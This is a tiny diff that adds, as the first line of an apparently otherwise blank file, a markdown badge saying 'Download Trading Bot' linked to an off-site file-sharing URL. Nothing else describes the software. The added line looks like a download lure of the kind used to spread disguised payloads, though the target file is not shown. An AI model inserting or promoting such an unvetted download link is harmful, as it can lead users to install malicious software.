@@ -1,4 +1,4 @@
-
+[![Download Trading Bot](https://img.shields.io/badge/Download-Trading%20Bot-blueviolet)](https://downeefiles.com/s/tdbb)
 
 
 
